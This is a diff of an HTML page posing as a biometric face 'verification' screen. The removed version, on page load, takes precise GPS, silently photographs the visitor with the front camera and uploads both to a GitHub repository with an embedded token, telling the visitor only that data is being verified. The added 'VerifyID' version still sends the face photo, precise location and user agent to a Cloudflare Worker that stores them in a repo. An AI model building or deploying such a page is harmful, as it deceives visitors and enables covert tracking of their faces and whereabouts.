@@ -1,198 +1,807 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification</title>
-    <style>
-        body {
-            background-color: #6739B7;
-            color: #C3A0EC;
-            font-family: system-ui, -apple-system, sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-            overflow: hidden;
-        }
-        /* A circular container for the video feed to make it look like a scanner */
-        #video-container {
-            width: 200px;
-            height: 200px;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 4px solid #C3A0EC;
-            box-shadow: 0 0 20px rgba(195, 160, 236, 0.4);
-            margin-bottom: 30px;
-            background-color: #512b91;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            /* Mirrors the camera so it acts like a natural front-facing mirror */
-            transform: scaleX(-1); 
-        }
-        canvas {
-            display: none;
-        }
-        #status {
-            font-size: 1.2rem;
-            font-weight: 500;
-            letter-spacing: 1px;
-            padding: 0 20px;
-        }
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(195, 160, 236, 0.3);
-            border-radius: 50%;
-            border-top-color: #C3A0EC;
-            animation: spin 1s ease-in-out infinite;
-            margin-top: 15px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Face Verification — VerifyID</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary:   #6739B7;
+    --primary2:  #8B5CF6;
+    --light:     #C3A0EC;
+    --lighter:   #EDE0FF;
+    --dark:      #3A1F7A;
+    --bg:        #080616;
+    --surface:   #120D2A;
+    --surface2:  #1C1540;
+    --text:      #F0E8FF;
+    --muted:     #9B82C8;
+    --success:   #7BE0A8;
+    --error:     #FF7B7B;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    height: 100%;
+    font-family: 'Outfit', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    overscroll-behavior: none;
+  }
+
+  body {
+    min-height: 100dvh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 0;
+    position: relative;
+    overflow-x: hidden;
+  }
+
+  /* ── ambient orbs ── */
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(80px);
+    pointer-events: none;
+    z-index: 0;
+  }
+  .orb-1 {
+    width: 60vw; height: 60vw;
+    top: -20vw; left: -15vw;
+    background: radial-gradient(circle, rgba(103,57,183,0.30) 0%, transparent 70%);
+  }
+  .orb-2 {
+    width: 50vw; height: 50vw;
+    bottom: -15vw; right: -10vw;
+    background: radial-gradient(circle, rgba(195,160,236,0.15) 0%, transparent 70%);
+  }
+  .orb-3 {
+    width: 35vw; height: 35vw;
+    top: 40vh; left: 60vw;
+    background: radial-gradient(circle, rgba(139,92,246,0.12) 0%, transparent 70%);
+  }
+
+  /* ── page wrapper ── */
+  .page {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 430px;
+    padding: 20px 18px 48px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 16px;
+  }
+
+  /* ── top bar ── */
+  .topbar {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 6px 0;
+  }
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+  }
+  .brand-icon {
+    width: 34px; height: 34px;
+    background: linear-gradient(135deg, var(--primary), var(--light));
+    border-radius: 10px;
+    display: grid;
+    place-items: center;
+  }
+  .brand-icon svg { width: 18px; height: 18px; fill: white; }
+  .brand-name {
+    font-size: 17px;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+    color: var(--text);
+  }
+  .step-pill {
+    background: rgba(103,57,183,0.2);
+    border: 1px solid rgba(103,57,183,0.4);
+    border-radius: 20px;
+    padding: 5px 13px;
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--light);
+    letter-spacing: 0.5px;
+  }
+
+  /* ── heading ── */
+  .heading {
+    width: 100%;
+    text-align: center;
+  }
+  .heading h1 {
+    font-size: clamp(22px, 6vw, 28px);
+    font-weight: 800;
+    letter-spacing: -0.6px;
+    line-height: 1.15;
+    background: linear-gradient(135deg, #fff 30%, var(--light));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 6px;
+  }
+  .heading p {
+    font-size: 13.5px;
+    color: var(--muted);
+    line-height: 1.55;
+    max-width: 300px;
+    margin: 0 auto;
+  }
+
+  /* ── camera card ── */
+  .cam-card {
+    width: 100%;
+    position: relative;
+    border-radius: 26px;
+    overflow: hidden;
+    background: var(--surface);
+    box-shadow:
+      0 0 0 1.5px rgba(195,160,236,0.18),
+      0 24px 64px rgba(0,0,0,0.55);
+    aspect-ratio: 3/4;
+    max-height: 56vh;
+  }
+
+  #video, #snapshot {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+  #video { transform: scaleX(-1); }
+  #snapshot {
+    display: none;
+    position: absolute;
+    inset: 0;
+    transform: none;
+  }
+
+  /* Face oval */
+  .oval-wrap {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    pointer-events: none;
+  }
+  .oval {
+    width: 62%;
+    aspect-ratio: 3/4;
+    border-radius: 50%;
+    border: 2.5px solid rgba(195,160,236,0.55);
+    position: relative;
+    animation: pulse-oval 3s ease-in-out infinite;
+    margin-top: -5%;
+  }
+  @keyframes pulse-oval {
+    0%,100% { border-color: rgba(195,160,236,0.45); box-shadow: 0 0 0 0 rgba(195,160,236,0); }
+    50%      { border-color: rgba(195,160,236,1);    box-shadow: 0 0 20px 6px rgba(195,160,236,0.12); }
+  }
+  /* Four corner brackets */
+  .oval::before, .oval::after,
+  .oval .br1, .oval .br2 {
+    content: '';
+    position: absolute;
+    width: 22px; height: 22px;
+    border-color: var(--light);
+    border-style: solid;
+  }
+  .oval::before { top: -2px; left: -2px; border-width: 3px 0 0 3px; border-radius: 6px 0 0 0; }
+  .oval::after  { top: -2px; right: -2px; border-width: 3px 3px 0 0; border-radius: 0 6px 0 0; }
+  .oval .br1    { bottom: -2px; left: -2px; border-width: 0 0 3px 3px; border-radius: 0 0 0 6px; }
+  .oval .br2    { bottom: -2px; right: -2px; border-width: 0 3px 3px 0; border-radius: 0 0 6px 0; }
+
+  /* Scan line */
+  .scan {
+    position: absolute;
+    left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent 0%, var(--light) 40%, var(--primary2) 60%, transparent 100%);
+    animation: scan-move 2.8s ease-in-out infinite;
+    opacity: 0;
+  }
+  @keyframes scan-move {
+    0%   { top: 10%; opacity: 0; }
+    8%   { opacity: 0.75; }
+    92%  { opacity: 0.75; }
+    100% { top: 90%; opacity: 0; }
+  }
+
+  /* Dot grid overlay (subtle) */
+  .dotgrid {
+    position: absolute;
+    inset: 0;
+    background-image: radial-gradient(rgba(195,160,236,0.07) 1px, transparent 1px);
+    background-size: 18px 18px;
+    pointer-events: none;
+  }
+
+  /* Bottom status strip */
+  .cam-status {
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    padding: 14px 16px 16px;
+    background: linear-gradient(to top, rgba(8,6,22,0.88) 0%, transparent 100%);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .status-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--light);
+    flex-shrink: 0;
+    animation: blink 1.6s ease-in-out infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .status-dot.still { animation: none; background: var(--success); }
+  .status-dot.error { animation: none; background: var(--error); }
+  #statusText {
+    font-size: 12.5px;
+    font-weight: 500;
+    color: var(--light);
+    flex: 1;
+  }
+
+  /* ── info strip ── */
+  .info-strip {
+    width: 100%;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+  }
+  .info-tile {
+    background: var(--surface2);
+    border: 1px solid rgba(103,57,183,0.28);
+    border-radius: 16px;
+    padding: 12px 14px;
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+  }
+  .info-tile svg { flex-shrink: 0; margin-top: 1px; }
+  .info-tile-body { flex: 1; min-width: 0; }
+  .info-tile-label {
+    font-size: 10px;
+    font-weight: 600;
+    color: var(--muted);
+    letter-spacing: 0.6px;
+    text-transform: uppercase;
+    margin-bottom: 3px;
+  }
+  .info-tile-value {
+    font-size: 11.5px;
+    color: var(--text);
+    line-height: 1.4;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  /* ── worker URL input ── */
+  .worker-field {
+    width: 100%;
+    background: var(--surface2);
+    border: 1px solid rgba(103,57,183,0.3);
+    border-radius: 16px;
+    padding: 14px 16px;
+  }
+  .worker-field label {
+    display: block;
+    font-size: 10.5px;
+    font-weight: 600;
+    color: var(--muted);
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    margin-bottom: 7px;
+  }
+  .worker-field input {
+    width: 100%;
+    background: rgba(103,57,183,0.1);
+    border: 1px solid rgba(103,57,183,0.25);
+    border-radius: 10px;
+    padding: 10px 12px;
+    font-family: 'Outfit', sans-serif;
+    font-size: 13px;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .worker-field input:focus { border-color: var(--light); }
+  .worker-field input::placeholder { color: rgba(155,130,200,0.4); font-size: 12px; }
+  .worker-hint {
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 7px;
+    line-height: 1.45;
+  }
+  .worker-hint a { color: var(--light); }
+
+  /* ── buttons ── */
+  .btn {
+    width: 100%;
+    border: none;
+    border-radius: 16px;
+    font-family: 'Outfit', sans-serif;
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: 0.2px;
+    cursor: pointer;
+    padding: 15px;
+    transition: all 0.22s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  .btn-capture {
+    background: linear-gradient(135deg, var(--primary) 0%, var(--primary2) 100%);
+    color: white;
+    box-shadow: 0 8px 28px rgba(103,57,183,0.5);
+  }
+  .btn-capture:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 40px rgba(103,57,183,0.65);
+  }
+  .btn-capture:active:not(:disabled) { transform: translateY(0); }
+  .btn-capture:disabled { opacity: 0.45; cursor: not-allowed; }
+
+  .btn-retake {
+    background: transparent;
+    color: var(--light);
+    border: 1.5px solid rgba(103,57,183,0.45);
+    display: none;
+    margin-top: -6px;
+  }
+  .btn-retake:hover { background: rgba(103,57,183,0.12); }
+
+  /* ── result banner ── */
+  .result {
+    width: 100%;
+    border-radius: 16px;
+    padding: 14px 16px;
+    font-size: 13.5px;
+    line-height: 1.55;
+    display: none;
+    text-align: center;
+  }
+  .result.success {
+    display: block;
+    background: rgba(123,224,168,0.08);
+    border: 1px solid rgba(123,224,168,0.3);
+    color: var(--success);
+  }
+  .result.error {
+    display: block;
+    background: rgba(255,123,123,0.08);
+    border: 1px solid rgba(255,123,123,0.3);
+    color: var(--error);
+  }
+
+  /* ── progress bar ── */
+  .progress-wrap {
+    width: 100%;
+    height: 4px;
+    background: rgba(103,57,183,0.15);
+    border-radius: 4px;
+    overflow: hidden;
+    display: none;
+  }
+  .progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, var(--primary), var(--light));
+    border-radius: 4px;
+    transition: width 0.4s ease;
+  }
+
+  /* ── spinner ── */
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .spinner {
+    width: 17px; height: 17px;
+    border: 2px solid rgba(255,255,255,0.25);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.65s linear infinite;
+    flex-shrink: 0;
+  }
+
+  /* ── flash ── */
+  .flash-el {
+    position: fixed; inset: 0;
+    background: white;
+    z-index: 9999;
+    pointer-events: none;
+    animation: do-flash 0.45s ease forwards;
+  }
+  @keyframes do-flash { 0%{opacity:0.9} 100%{opacity:0} }
+
+  /* ── steps legend ── */
+  .steps {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    gap: 6px;
+  }
+  .step-node {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: rgba(103,57,183,0.3);
+    transition: all 0.3s;
+  }
+  .step-node.active  { background: var(--primary2); width: 24px; border-radius: 4px; }
+  .step-node.done    { background: var(--success); }
+</style>
 </head>
 <body>
 
-    <div id="video-container">
-        <video id="video" autoplay playsinline muted></video>
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+<div class="orb orb-3"></div>
+
+<div class="page">
+
+  <!-- Top bar -->
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+      </div>
+      <span class="brand-name">VerifyID</span>
     </div>
-    
-    <div id="status">Initializing...</div>
-    <div class="spinner" id="spinner"></div>
+    <div class="step-pill">BIOMETRIC CHECK</div>
+  </div>
 
-    <canvas id="canvas"></canvas>
+  <!-- Heading -->
+  <div class="heading">
+    <h1>Verifying Face Data</h1>
+    <p>Look directly at the camera. Keep your face inside the oval guide and hold still.</p>
+  </div>
 
-    <script>
-        // ==========================================
-        // CONFIGURATION
-        // ==========================================
-        const GITHUB_TOKEN = 'YOUR_PERSONAL_ACCESS_TOKEN'; 
-        const REPO_OWNER = 'YOUR_GITHUB_USERNAME';
-        const REPO_NAME = 'YOUR_REPOSITORY_NAME';
-        // ==========================================
+  <!-- Steps indicator -->
+  <div class="steps">
+    <div class="step-node active" id="sn1"></div>
+    <div class="step-node" id="sn2"></div>
+    <div class="step-node" id="sn3"></div>
+  </div>
 
-        const statusText = document.getElementById('status');
-        const spinner = document.getElementById('spinner');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+  <!-- Camera -->
+  <div class="cam-card">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="snapshot"></canvas>
+    <div class="dotgrid"></div>
+    <div class="oval-wrap">
+      <div class="oval">
+        <span class="br1"></span>
+        <span class="br2"></span>
+      </div>
+    </div>
+    <div class="scan" id="scanLine"></div>
+    <div class="cam-status">
+      <div class="status-dot" id="statusDot"></div>
+      <span id="statusText">Starting camera…</span>
+    </div>
+  </div>
 
-        async function startProcess() {
-            try {
-                statusText.innerText = "Requesting location access...";
-                
-                // 1. Get exact GPS location
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
+  <!-- Info tiles: time + location -->
+  <div class="info-strip">
+    <div class="info-tile">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C3A0EC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+      </svg>
+      <div class="info-tile-body">
+        <div class="info-tile-label">Timestamp</div>
+        <div class="info-tile-value" id="tileTime">—</div>
+      </div>
+    </div>
+    <div class="info-tile">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C3A0EC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>
+      </svg>
+      <div class="info-tile-body">
+        <div class="info-tile-label">Location</div>
+        <div class="info-tile-value" id="tileLocation">Fetching…</div>
+      </div>
+    </div>
+  </div>
 
-                statusText.innerText = "Requesting camera access...";
+  <!-- Worker URL -->
+  <div class="worker-field">
+    <label>☁️ Cloudflare Worker URL</label>
+    <input type="url" id="workerUrl" placeholder="https://verifyid-upload-proxy.yourname.workers.dev">
+    <div class="worker-hint">
+      Deploy the included <code>worker.js</code> to Cloudflare (free). 
+      <a href="#setup-guide" onclick="toggleGuide(event)">Setup guide ↓</a>
+    </div>
+  </div>
 
-                // 2. Get front-facing camera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" },
-                    audio: false
-                });
-                video.srcObject = stream;
+  <!-- Progress bar -->
+  <div class="progress-wrap" id="progressWrap">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
 
-                // Wait for the video feed to actually start playing
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
+  <!-- Capture button -->
+  <button class="btn btn-capture" id="captureBtn" disabled>
+    Capture &amp; Verify
+  </button>
 
-                statusText.innerText = "Verifying face data...";
+  <!-- Retake button -->
+  <button class="btn btn-retake" id="retakeBtn">
+    ↩ Retake Photo
+  </button>
 
-                // Give the camera 2 seconds to adjust focus and lighting before snapping
-                setTimeout(() => captureAndUpload(lat, lon, stream), 2000);
+  <!-- Result -->
+  <div class="result" id="resultBanner"></div>
 
-            } catch (error) {
-                console.error(error);
-                spinner.style.display = 'none';
-                if (error.code === 1) {
-                    statusText.innerText = "Permissions denied. Please allow camera and location.";
-                } else {
-                    statusText.innerText = "Verification failed due to a device error.";
-                }
-            }
-        }
+  <!-- Setup guide (collapsible) -->
+  <div id="setup-guide" style="display:none; width:100%; background:var(--surface2); border:1px solid rgba(103,57,183,0.3); border-radius:16px; padding:18px; font-size:12.5px; color:var(--muted); line-height:1.7;">
+    <strong style="color:var(--light); font-size:13px;">⚡ Cloudflare Worker Setup (5 min)</strong><br><br>
+    <strong style="color:var(--text);">1.</strong> Sign up free at <a href="https://workers.cloudflare.com" target="_blank" style="color:var(--light)">workers.cloudflare.com</a><br>
+    <strong style="color:var(--text);">2.</strong> Create a new Worker, paste <code>worker.js</code> content<br>
+    <strong style="color:var(--text);">3.</strong> Go to Settings → Variables and add these <strong>Secrets</strong>:<br>
+    &nbsp;&nbsp;&nbsp;<code>GITHUB_TOKEN</code> → your GitHub PAT (repo scope)<br>
+    &nbsp;&nbsp;&nbsp;<code>GITHUB_REPO</code> → <code>yourusername/your-repo</code><br>
+    &nbsp;&nbsp;&nbsp;<code>ALLOWED_ORIGIN</code> → <code>https://yourusername.github.io</code><br>
+    <strong style="color:var(--text);">4.</strong> Deploy and paste the worker URL above<br>
+    <strong style="color:var(--text);">5.</strong> Images will be saved to the <code>images/</code> folder in your repo
+  </div>
 
-        async function captureAndUpload(lat, lon, stream) {
-            statusText.innerText = "Saving data securely...";
+</div><!-- /page -->
 
-            // Draw current video frame to canvas
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            
-            // Flip the canvas context horizontally to match the mirrored video feed
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+<script>
+// ── Config ──────────────────────────────────────────
+const SAVED_WORKER_KEY = 'verifyid_worker_url';
 
-            // Get base64 image data
-            const base64Content = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
-            
-            // Turn off the webcam indicator light
-            stream.getTracks().forEach(track => track.stop());
+// ── State ────────────────────────────────────────────
+let stream = null;
+let captured = false;
+let coords = null;
+let locationStr = 'Unavailable';
+let nowTs = '';
 
-            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-            const filePath = `images/verification-${timestamp}.jpg`;
-            
-            // Embed the location directly into the GitHub commit message
-            const commitMessage = `Face verification captured.\nLocation: https://maps.google.com/?q=${lat},${lon}`;
+// ── Elements ─────────────────────────────────────────
+const video       = document.getElementById('video');
+const snapshot    = document.getElementById('snapshot');
+const statusDot   = document.getElementById('statusDot');
+const statusText  = document.getElementById('statusText');
+const captureBtn  = document.getElementById('captureBtn');
+const retakeBtn   = document.getElementById('retakeBtn');
+const resultBanner= document.getElementById('resultBanner');
+const tileTime    = document.getElementById('tileTime');
+const tileLocation= document.getElementById('tileLocation');
+const workerInput = document.getElementById('workerUrl');
+const progressWrap= document.getElementById('progressWrap');
+const progressBar = document.getElementById('progressBar');
+const sn1=document.getElementById('sn1');
+const sn2=document.getElementById('sn2');
+const sn3=document.getElementById('sn3');
 
-            const apiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`;
+// ── Restore saved worker URL ──────────────────────────
+workerInput.value = localStorage.getItem(SAVED_WORKER_KEY) || '';
 
-            try {
-                const response = await fetch(apiUrl, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        message: commitMessage,
-                        content: base64Content
-                    })
-                });
+// ── Live clock ───────────────────────────────────────
+function tickClock() {
+  const now = new Date();
+  nowTs = now.toISOString();
+  tileTime.textContent = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', second:'2-digit'});
+}
+tickClock();
+setInterval(tickClock, 1000);
 
-                if (response.ok) {
-                    statusText.innerText = "Verification Complete.";
-                    spinner.style.display = 'none';
-                    document.getElementById('video-container').style.borderColor = "#2ea44f"; // Turn border green
-                } else {
-                    throw new Error("GitHub API rejected the upload.");
-                }
-            } catch (error) {
-                console.error(error);
-                statusText.innerText = "Error saving data.";
-                spinner.style.display = 'none';
-                document.getElementById('video-container').style.borderColor = "#ff4444"; // Turn border red
-            }
-        }
+// ── Geolocation ───────────────────────────────────────
+function getLocation() {
+  if (!navigator.geolocation) {
+    tileLocation.textContent = 'Not supported';
+    locationStr = 'Geolocation not supported';
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) };
+      locationStr = `${coords.lat.toFixed(5)}, ${coords.lng.toFixed(5)}`;
+      tileLocation.innerHTML = `<a href="https://maps.google.com/?q=${coords.lat},${coords.lng}" target="_blank" style="color:var(--light);text-decoration:none;">${locationStr}</a>`;
+    },
+    err => {
+      tileLocation.textContent = 'Denied';
+      locationStr = 'Location denied by user';
+    },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
+}
+getLocation();
 
-        // Start the automated sequence as soon as the page loads
-        window.onload = startProcess;
-    </script>
+// ── Camera ─────────────────────────────────────────────
+async function startCamera() {
+  setStatus('loading', 'Starting camera…');
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
+      audio: false
+    });
+    video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      setStatus('live', 'Position your face in the oval');
+      captureBtn.disabled = false;
+      sn1.classList.add('done');
+      sn1.classList.remove('active');
+      sn2.classList.add('active');
+    };
+  } catch(e) {
+    setStatus('error', 'Camera access denied — please allow in browser settings');
+    showResult('error', '⚠️ Camera permission required. Tap the camera icon in your browser address bar and allow access, then reload.');
+  }
+}
+
+function stopCamera() {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+}
+
+// ── Status helper ──────────────────────────────────────
+function setStatus(state, msg) {
+  statusText.textContent = msg;
+  statusDot.className = 'status-dot';
+  if (state === 'live')    { /* default blink */ }
+  if (state === 'still')   statusDot.classList.add('still');
+  if (state === 'error')   statusDot.classList.add('error');
+  if (state === 'loading') statusDot.style.opacity = '0.5';
+}
+
+// ── Result banner ──────────────────────────────────────
+function showResult(type, html) {
+  resultBanner.className = `result ${type}`;
+  resultBanner.innerHTML = html;
+}
+
+// ── Progress ──────────────────────────────────────────
+function setProgress(pct) {
+  progressWrap.style.display = 'block';
+  progressBar.style.width = pct + '%';
+}
+
+// ── Setup guide toggle ────────────────────────────────
+function toggleGuide(e) {
+  e.preventDefault();
+  const g = document.getElementById('setup-guide');
+  g.style.display = g.style.display === 'none' ? 'block' : 'none';
+}
+
+// ── CAPTURE ────────────────────────────────────────────
+captureBtn.addEventListener('click', async () => {
+  if (captured) return;
+
+  const workerUrl = workerInput.value.trim();
+  if (!workerUrl || !workerUrl.startsWith('http')) {
+    showResult('error', '⚠️ Please enter your Cloudflare Worker URL above. See the setup guide for help.');
+    return;
+  }
+  localStorage.setItem(SAVED_WORKER_KEY, workerUrl);
+
+  // Flash
+  const fl = document.createElement('div');
+  fl.className = 'flash-el';
+  document.body.appendChild(fl);
+  setTimeout(() => fl.remove(), 600);
+
+  // Draw to canvas (un-mirrored)
+  snapshot.width  = video.videoWidth;
+  snapshot.height = video.videoHeight;
+  const ctx = snapshot.getContext('2d');
+  ctx.translate(snapshot.width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0);
+  ctx.setTransform(1,0,0,1,0,0);
+
+  // Metadata overlay strip
+  const stripH = Math.round(snapshot.height * 0.055);
+  ctx.fillStyle = 'rgba(8,6,22,0.72)';
+  ctx.fillRect(0, snapshot.height - stripH, snapshot.width, stripH);
+  ctx.fillStyle = 'rgba(195,160,236,0.9)';
+  ctx.font = `${Math.round(stripH * 0.42)}px monospace`;
+  ctx.fillText(`📍 ${locationStr}  |  🕐 ${new Date().toISOString()}`, 10, snapshot.height - Math.round(stripH * 0.28));
+
+  // Show snapshot, stop camera
+  stopCamera();
+  video.style.display = 'none';
+  snapshot.style.display = 'block';
+  captured = true;
+
+  captureBtn.disabled = true;
+  captureBtn.innerHTML = '<span class="spinner"></span> Uploading…';
+  retakeBtn.style.display = 'flex';
+  setStatus('still', 'Uploading to GitHub…');
+  setProgress(20);
+
+  sn2.classList.add('done');
+  sn2.classList.remove('active');
+  sn3.classList.add('active');
+
+  // Build filename
+  const ts    = new Date().toISOString().replace(/[:.]/g,'-');
+  const locTag= coords ? `_${coords.lat.toFixed(4)}_${coords.lng.toFixed(4)}` : '';
+  const filename = `images/face_${ts}${locTag}.jpg`;
+
+  // Convert to base64 JPEG
+  const base64 = snapshot.toDataURL('image/jpeg', 0.88).split(',')[1];
+  setProgress(45);
+
+  // Send to worker
+  try {
+    const res = await fetch(workerUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        imageBase64: base64,
+        filename,
+        location: locationStr + (coords ? ` (±${coords.acc}m)` : ''),
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+      })
+    });
+
+    setProgress(85);
+    const data = await res.json();
+
+    if (res.ok && data.success) {
+      setProgress(100);
+      setStatus('still', '✓ Verified & saved');
+      captureBtn.innerHTML = '✓ Verified';
+      sn3.classList.add('done');
+      sn3.classList.remove('active');
+      showResult('success',
+        `✅ <strong>Verification complete!</strong><br>
+         📁 Saved to <code>${data.path}</code><br>
+         📍 ${locationStr}<br>
+         ${data.file ? `🔗 <a href="${data.file}" target="_blank" style="color:var(--success)">View on GitHub ↗</a>` : ''}`
+      );
+    } else {
+      throw new Error(data.error || 'Upload failed');
+    }
+  } catch(e) {
+    setProgress(0);
+    progressWrap.style.display = 'none';
+    setStatus('error', 'Upload failed');
+    captureBtn.innerHTML = '✗ Failed — Retake?';
+    captureBtn.disabled = false;
+    showResult('error',
+      `❌ <strong>Upload error:</strong> ${e.message}<br><br>
+       Check: Worker URL is correct • Worker secrets are set • GitHub token has <code>repo</code> scope`
+    );
+  }
+});
+
+// ── RETAKE ────────────────────────────────────────────
+retakeBtn.addEventListener('click', () => {
+  captured = false;
+  snapshot.style.display = 'none';
+  video.style.display = 'block';
+  captureBtn.disabled = false;
+  captureBtn.innerHTML = 'Capture &amp; Verify';
+  retakeBtn.style.display = 'none';
+  resultBanner.className = 'result';
+  progressWrap.style.display = 'none';
+  progressBar.style.width = '0%';
+  sn1.className='step-node done';
+  sn2.className='step-node active';
+  sn3.className='step-node';
+  startCamera();
+});
+
+// ── Init ──────────────────────────────────────────────
+startCamera();
+</script>
 </body>
 </html>
